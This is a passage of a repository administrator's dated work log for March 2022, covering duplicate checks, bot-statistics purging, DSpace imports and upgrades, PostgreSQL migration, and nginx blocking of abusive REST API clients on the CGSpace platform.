- Send Gaia the last batch of potential duplicates for items 701 to 980:

```console
$ csvcut -c id,dc.title,dcterms.issued,dcterms.type ~/Downloads/2022-03-01-CGSpace-TAC-ICW-batch4-701-980.csv > /tmp/tac4.csv
$ ./ilri/check-duplicates.py -i /tmp/tac4.csv -db dspace -u dspace -p 'fuuu' -o /tmp/2022-03-01-tac-batch4-701-980.csv
$ csvcut -c id,filename ~/Downloads/2022-03-01-CGSpace-TAC-ICW-batch4-701-980.csv > /tmp/tac4-filenames.csv
$ csvjoin -c id /tmp/2022-03-01-tac-batch4-701-980.csv /tmp/tac4-filenames.csv > /tmp/2022-03-01-tac-batch4-701-980-filenames.csv
```

- Looking over the CGSpace Solr statistics from 2022-02
  - I see a few new bots, though once I expanded my search for user agents with "www" in the name I found so many more!
  - Here are some of the more prevalent or weird ones:
    - axios/0.21.1
    - Mozilla/5.0 (compatible; Faveeo/1.0; +http://www.faveeo.com)

  - I submitted [a pull request to COUNTER-Robots](https://github.com/atmire/COUNTER-Robots/pull/52) with some of these
- I purged a bunch of hits from the stats using the `check-spider-hits.sh` script:

```console
]$ ./ilri/check-spider-hits.sh -f dspace/config/spiders/agents/ilri -p
Purging 6 hits from scalaj-http in statistics
Purging 5 hits from lua-resty-http in statistics

Purging 2755 hits from Nutch-[0-9] in statistics

Total number of bot hits purged: 12914
```

- I added a few from that list to the local overrides in our DSpace while I wait for feedback from the COUNTER-Robots project

- Start AReS harvest

## 2022-03-10

- A few days ago Gaia sent me her notes on the fourth batch of TAC/ICW documents (items 701–980 in the spreadsheet)
  - I created a filter in LibreOffice and selected the IDs for items with the action "delete", then I created a custom text facet in OpenRefine with this GREL:

```
or(
isNotNull(value.match('707')),
isNotNull(value.match('709')),
isNotNull(value.match('710')),
isNotNull(value.match('711')),
isNotNull(value.match('713')),
isNotNull(value.match('717')),
isNotNull(value.match('718')),
...
isNotNull(value.match('821'))
)
```

- Then I flagged all matching records, exported a CSV to use with SAFBuilder, and imported them on DSpace Test:

```console
$ JAVA_OPTS="-Xmx1024m -Dfile.encoding=UTF-8" dspace import --add --eperson=fuu@ummm.com --source /tmp/SimpleArchiveFormat --mapfile=./2022-03-10-tac-batch4-701to980.map
```

## 2022-03-12

- Update all containers and rebuild OpenRXV on linode20:

```console
$ docker images | grep -v ^REPO | sed 's/ \+/:/g' | cut -d: -f1,2 | xargs -L1 docker pull
$ docker-compose build
```

- Then run all system updates and reboot
- Start a full harvest on AReS

## 2022-03-16

- Meeting with KM/KS group to start talking about the way forward for repositories and web publishing
  - We agreed to form a sub-group of the transition task team to put forward a recommendation for repository and web publishing

## 2022-03-20

- Start a full harvest on AReS

## 2022-03-21

- Review a few submissions for Open Repositories 2022
- Test one tentative DSpace 6.4 patch and give feedback on a few more that Hrafn missed

## 2022-03-22

- I accidentally dropped the PostgreSQL database on DSpace Test, forgetting that I had all the CGIAR CAS items there
  - I had been meaning to update my local database...
- I re-imported the CGIAR CAS documents to [DSpace Test](https://dspacetest.cgiar.org/handle/10568/118432) and generated the PDF thumbnails:

```console
$ JAVA_OPTS="-Xmx1024m -Dfile.encoding=UTF-8" dspace import --add --eperson=fuu@ma.com --source /tmp/SimpleArchiveFormat --mapfile=./2022-03-22-tac-700.map
$ JAVA_OPTS="-Xmx1024m -Dfile.encoding=UTF-8" dspace filter-media -p "ImageMagick PDF Thumbnail" -i 10568/118432
```

- On my local environment I decided to run the `check-duplicates.py` script one more time with all 700 items:

```console
$ csvcut -c id,dc.title,dcterms.issued,dcterms.type ~/Downloads/TAC_ICW_GreenCovers/2022-03-22-tac-700.csv > /tmp/tac.csv
$ ./ilri/check-duplicates.py -i /tmp/tac.csv -db dspacetest -u dspacetest -p 'dom@in34sniper' -o /tmp/2022-03-22-tac-duplicates.csv
$ csvcut -c id,filename ~/Downloads/2022-01-21-CGSpace-TAC-ICW.csv > /tmp/tac-filenames.csv
$ csvjoin -c id /tmp/2022-03-22-tac-duplicates.csv /tmp/tac-filenames.csv > /tmp/tac-final-duplicates.csv
```

- I sent the resulting 76 items to Gaia to check
- UptimeRobot said that CGSpace was down
  - I looked and found many locks belonging to the REST API application:

```console
$ psql -c 'SELECT * FROM pg_locks pl LEFT JOIN pg_stat_activity psa ON pl.pid = psa.pid;' | grep -o -E '(dspaceWeb|dspaceApi)' | sort | uniq -c | sort -n
    301 dspaceWeb
   2390 dspaceApi
```

- Looking at nginx's logs, I found the top addresses making requests today:

```console
# awk '{print $1}' /var/log/nginx/rest.log | sort | uniq -c | sort -h
   1977 45.5.184.2
   3167 70.32.90.172
   4754 54.195.118.125
   5411 205.186.128.185
   6826 137.184.159.211
```

- 137.184.159.211 is on DigitalOcean using this user agent: `GuzzleHttp/6.3.3 curl/7.81.0 PHP/7.4.28`
  - I blocked this IP in nginx and the load went down immediately
- 205.186.128.185 is on Media Temple, but it's OK because it's the CCAFS publications importer bot
- 54.195.118.125 is on Amazon, but is also a CCAFS publications importer bot apparently (perhaps a test server)
- 70.32.90.172 is on Media Temple and has no user agent
- What is surprising to me is that we already have an nginx rule to return HTTP 403 for requests without a user agent
  - I verified it works as expected with an empty user agent:

```console
$ curl -H User-Agent:'' 'https://dspacetest.cgiar.org/rest/handle/10568/34799?expand=all' 
Due to abuse we no longer permit requests without a user agent. Please specify a descriptive user agent, for example containing the word 'bot', if you are accessing the site programmatically. For more information see here: https://dspacetest.cgiar.org/page/about.
```

- I note that the nginx log shows '-' for a request with an empty user agent, which would be indistinguishable from a request with a '-', for example these were successful:

```console
70.32.90.172 - - [22/Mar/2022:11:59:10 +0100] "GET /rest/handle/10568/34374?expand=all HTTP/1.0" 200 10671 "-" "-"
70.32.90.172 - - [22/Mar/2022:11:59:14 +0100] "GET /rest/handle/10568/34795?expand=all HTTP/1.0" 200 11394 "-" "-"
```

- I can only assume that these requests used a literal '-' so I will have to add an nginx rule to block those too
- Otherwise, I see from my notes that 70.32.90.172 is the wle.cgiar.org REST API harvester... I should ask Macaroni Bros about that

## 2022-03-24

- Maria from ABC asked about a reporting discrepancy on AReS
  - I think it's because the last harvest was over the weekend, and she was expecting to see items submitted this week
- Paola from ABC said they are decomissioning the server where many of their library PDFs are hosted
  - She asked if we can download them and upload them directly to CGSpace
- I re-created my local Artifactory container
- I am doing a walkthrough of DSpace 7.3-SNAPSHOT to see how things are lately
  - One thing I realized is that OAI is no longer a standalone web application, it is part of the `server` app now: http://localhost:8080/server/oai/request?verb=Identify
- Deploy PostgreSQL 12 on CGSpace (linode18) but don't switch over yet, because I see some users active
  - I did this on DSpace Test in 2022-02 so I just followed the same procedure
  - After that I ran all system updates and rebooted the server

## 2022-03-25

- Looking at the PostgreSQL database size on CGSpace after the update yesterday:

![PostgreSQL database size day](/cgspace-notes/2022/03/postgres_size_cgspace-day.png)

- The space saving in indexes of recent PostgreSQL releases is awesome!
- Import a DSpace 6.x database dump from production into my local DSpace 7 database
  - I see I still the same errors [I saw in 2021-04]({{< relref "2021-04.md" >}}) when testing DSpace 7.0 beta 5
  - I had to delete some old migrations, as well as all Atmire ones first:

```console
localhost/dspace7= ☘ DELETE FROM schema_version WHERE version IN ('5.0.2017.09.25', '6.0.2017.01.30', '6.0.2017.09.25');
localhost/dspace7= ☘ DELETE FROM schema_version WHERE description LIKE '%Atmire%' OR description LIKE '%CUA%' OR description LIKE '%cua%'
```

- Then I was able to migrate to DSpace 7 with `dspace database migrate ignored` as the [DSpace upgrade notes say](https://wiki.lyrasis.org/display/DSDOC7x/Upgrading+DSpace)
  - I see that the [flash of unstyled content bug](https://github.com/DSpace/dspace-angular/issues/1357) still exists on dspace-angluar... ouch!
- Start a harvest on AReS

## 2022-03-26

- Update dspace-statistics-api to Falcon 3.1.0 and [release v1.4.3](https://github.com/ilri/dspace-statistics-api/releases/tag/v1.4.3)
